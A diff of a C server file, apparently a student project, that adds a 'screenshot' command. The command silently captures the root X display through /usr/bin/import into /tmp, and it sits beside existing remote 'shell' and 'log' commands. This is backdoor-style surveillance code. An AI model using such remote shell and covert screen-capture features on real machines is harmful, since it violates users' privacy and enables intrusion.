@@ -6,7 +6,7 @@
 /*   By: banthony </var/mail/banthony>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/11/14 12:51:21 by banthony          #+#    #+#             */
-/*   Updated: 2019/11/27 16:19:13 by banthony         ###   ########.fr       */
+/*   Updated: 2019/11/28 16:59:54 by banthony         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -212,6 +212,17 @@ static t_bool	server_cmd_stat(t_client *client, t_server *server)
 	return (true);
 }
 
+static t_bool	server_cmd_screenshot(t_client *client, t_server *server)
+{
+	char	*screenshot[] = {"/usr/bin/import", "-window", "root", "/tmp/img_"__TIME__".jpeg", NULL};
+	char	*env[] = {"DISPLAY=:0", "HOME=/home/banthony", NULL};
+
+	if (!server || !client)
+		return (false);
+	exec_command(screenshot, "Taking screenshot ...", env);
+	return (true);
+}
+
 static const t_cmd g_server_cmd[SERVER_CMD_NUMBER] =
 {
 	[HELP] = COMMAND(help),
@@ -221,6 +232,7 @@ static const t_cmd g_server_cmd[SERVER_CMD_NUMBER] =
 	[SHELL] = COMMAND(shell),
 	[LOG] = COMMAND(log),
 	[EXIT] = COMMAND(exit),
+	[SCREENSHOT] = COMMAND(screenshot),
 };
 
 void	server_command_handler(char *raw_cmd, size_t cmd_size, t_server *server, t_client *client)
